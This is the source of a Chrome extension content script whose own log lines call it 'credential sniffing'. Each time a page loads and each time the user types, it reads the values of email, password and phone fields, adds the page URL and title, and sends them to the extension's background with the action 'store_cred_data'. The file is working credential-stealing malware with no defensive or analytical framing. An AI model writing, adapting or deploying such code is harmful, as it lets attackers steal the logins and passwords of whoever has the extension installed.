console.log("[DEBUG][Content] Injected content.js and starting credential sniffing...");

function extractAndSendData() {
  console.log("[DEBUG][Content] Checking for login input fields...");

  const inputs = document.querySelectorAll('input');
  let data = {
    title: document.title,
    url: window.location.href,
    timestamp: new Date().toISOString(),
    fields: []
  };

  let found = false;

  inputs.forEach(input => {
    const type = input.type || 'text';
    const value = input.value.trim();

    if (['email', 'password', 'tel'].includes(type) && value) {
      data.fields.push({ type, name: input.name || input.id || '', value });
      found = true;
    }
  });

  if (found) {
    console.log("[DEBUG][Content] Detected login data:", data);
    chrome.runtime.sendMessage({ action: 'store_cred_data', payload: data });
  } else {
    console.log("[DEBUG][Content] No relevant input fields with values detected yet.");
  }
}

window.addEventListener("load", () => {
  console.log("[DEBUG][Content] Page fully loaded.");
  extractAndSendData();
});

document.addEventListener("input", () => {
  console.log("[DEBUG][Content] User typed in an input field.");
  extractAndSendData();
});
